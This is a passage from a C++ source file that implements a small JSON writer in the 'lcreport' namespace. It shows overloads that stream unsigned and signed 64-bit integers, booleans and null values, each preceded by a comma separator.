        }
        ++i;
    }
    os_ << '"';
}

Json &Json::value(uint64_t v) {
    comma();
    os_ << v;
    return *this;
}

Json &Json::value(int64_t v) {
    comma();
    os_ << v;
    return *this;
}

Json &Json::value(bool v) {
    comma();
    os_ << (v ? "true" : "false");
    return *this;
}

Json &Json::null() {
    comma();
    os_ << "null";
    return *this;
}

} // namespace lcreport
